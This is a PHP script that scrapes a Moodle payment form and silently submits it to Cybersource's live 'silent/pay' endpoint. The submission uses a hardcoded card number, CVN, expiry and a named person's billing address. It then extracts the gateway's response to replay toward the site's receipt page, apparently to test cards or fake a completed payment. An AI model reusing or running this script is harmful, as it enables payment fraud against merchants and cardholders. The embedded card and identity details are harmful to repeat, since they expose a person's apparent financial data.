<?php
include './iframev2.1.php';

function extract_input_fields_with_values($html)
{
    $doc = new DOMDocument();
    libxml_use_internal_errors(true);
    $doc->loadHTML($html);
    libxml_clear_errors();

    $xpath = new DOMXPath($doc);
    $fields = [];

    // Extract all input fields that have name and a non-empty value
    $inputs = $xpath->query('//form[@id="moodleform4"]//input[@name]');
    foreach ($inputs as $input) {
        if ($input instanceof DOMElement) {
            $name = $input->getAttribute('name');
            $value = $input->getAttribute('value');
            if (trim($value) !== '') {
                $fields[$name] = $value;
            }
        }
    }

    return $fields;
}

function post_to_cybersource($url, $fields)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($fields));
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); // stop before redirect
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function extract_post_to_ipn($html)
{
    preg_match_all('/name=\"(.*?)\" value=\"(.*?)\"/', $html, $matches);
    $results = [];
    foreach ($matches[1] as $i => $key) {
        $results[$key] = $matches[2][$i];
    }
    return $results;
}

$html = pullData();
$fields = extract_input_fields_with_values($html);

// Hardcode required missing fields
$fields['card_number'] = '4246315380311140';
$fields['card_cvn'] = '700';
$fields['card_expiry_date'] = '09-2028';
$fields['bill_to_address_country'] = 'US';
$fields['bill_to_address_state'] = 'NC';
$fields['bill_to_address_city'] = 'Wilmington';
$fields['bill_to_address_line1'] = '433 Darlington Ave U';
$fields['bill_to_address_postal_code'] = '28403';
$fields['first_name'] = 'Brent';
$fields['last_name'] = 'Seaver';
$fields['eMonth'] = '09';
$fields['eYear'] = '2028';

// Step 1: POST to Cybersource silently
$cybersource_response = post_to_cybersource('https://secureacceptance.cybersource.com/silent/pay', $fields);

// Step 2: Simulate POST back to override_custom_receipt_page (extract form fields if possible)
$ipn_data = extract_post_to_ipn($cybersource_response);

// Display final POST body that would be sent to override_custom_receipt_page
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Cybersource POST Replay Result</title>
</head>
<body>
    <h2>📦 POST Data Sent to override_custom_receipt_page</h2>
    <pre><?php print_r($ipn_data); ?></pre>
</body>
</html>
